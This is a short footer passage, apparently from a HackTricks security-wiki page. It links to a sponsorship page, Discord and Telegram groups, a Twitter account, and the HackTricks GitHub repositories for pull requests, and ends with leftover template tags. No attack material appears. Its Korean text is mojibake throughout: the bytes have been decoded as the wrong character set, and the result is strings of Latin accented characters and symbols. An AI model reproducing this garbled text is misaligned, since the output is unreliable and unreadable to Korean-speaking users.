* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
